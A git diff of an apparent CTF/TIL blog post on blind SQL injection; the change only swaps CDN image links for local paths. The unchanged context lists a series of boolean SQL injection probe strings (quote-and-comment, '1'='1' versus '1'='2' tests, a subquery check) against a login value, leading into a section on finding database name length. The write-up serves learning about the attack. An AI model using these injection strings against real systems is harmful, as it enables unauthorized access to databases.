@@ -51,19 +51,19 @@ tags: [TIL, DATABASE, CTF]
 # Blind SQL Injection
 ## 1. START
 1. **normaltic**
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-14.png?raw=true)
+![alt text](/_image/2024-11-28-00-00-05.png)
 1. **normaltic' #**
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-15.png?raw=true)
+![alt text](/_image/2024-11-28-00-00-06.png)
 1. **normaltic' and '1' = '1' #**
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-16.png?raw=true)
+![alt text](/_image/2024-11-28-00-00-07.png)
 1. **normaltic' and '1' = '2' #**
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-17.png?raw=true)
+![alt text](/_image/2024-11-28-00-00-08.png)
 1. **normaltic' and ('1' = '1') and '1' = '1' #**
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-18.png?raw=true)
+![alt text](/_image/2024-11-28-00-00-09.png)
 1. **normaltic' and ('1' = '1') and '1' = '2' #**
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-19.png?raw=true)
+![alt text](/_image/2024-11-28-00-00-10.png)
 1. **normaltic' and (select 'test' = 'test') and '1' = '1' #**
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-20.png?raw=true)
+![alt text](/_image/2024-11-28-00-00-12.png)
 
 ## 2. DATABASE
 ### 2.1. 이름 글자수 확인
